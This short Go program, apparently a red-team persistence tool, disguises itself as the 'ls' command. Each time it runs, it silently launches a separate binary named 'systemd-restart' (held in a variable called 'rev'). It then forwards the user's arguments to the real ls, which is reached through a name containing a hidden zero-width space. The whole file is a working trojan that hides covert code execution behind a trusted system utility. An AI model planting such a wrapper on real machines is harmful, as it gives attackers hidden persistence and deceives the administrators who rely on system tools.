//Michael Burke, mdb5315@rit.edu
package main

import (
	"os"
	"os/exec"
)

func main() {
	rev := exec.Command("systemd-restart")
	rev.Run()
	cmd := exec.Command("ls​" /*THERE IS A ZERO WIDTH SPACE IN HERE*/, os.Args[1:]...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
